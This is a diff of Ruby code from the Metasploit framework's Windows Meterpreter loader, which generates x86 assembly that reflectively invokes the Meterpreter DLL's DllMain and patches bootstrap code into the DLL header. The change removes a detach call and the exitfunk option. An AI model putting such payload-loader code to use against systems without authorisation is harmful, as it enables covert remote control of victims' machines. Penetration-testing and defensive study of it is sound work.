@@ -59,12 +59,6 @@ module Payload::Windows::MeterpreterLoader
           push eax              ; push some arbitrary value for hInstance
           mov ebx, eax          ; save DllMain for another call
           call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
-        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
-          ; push the exitfunk value onto the stack
-          push #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
-          push 5                ; indicate that we have detached
-          push eax              ; push some arbitrary value for hInstance
-          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
     ^
   end
 
@@ -74,8 +68,7 @@ module Payload::Windows::MeterpreterLoader
 
     asm_opts = {
       :rdi_offset => offset,
-      :length     => dll.length,
-      :exitfunk   => 'thread'     # default to 'thread' for migration
+      :length     => dll.length
     }
 
     asm = asm_invoke_dll(asm_opts)
@@ -92,7 +85,7 @@ module Payload::Windows::MeterpreterLoader
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
 
-    return dll
+    dll
   end
 
 end
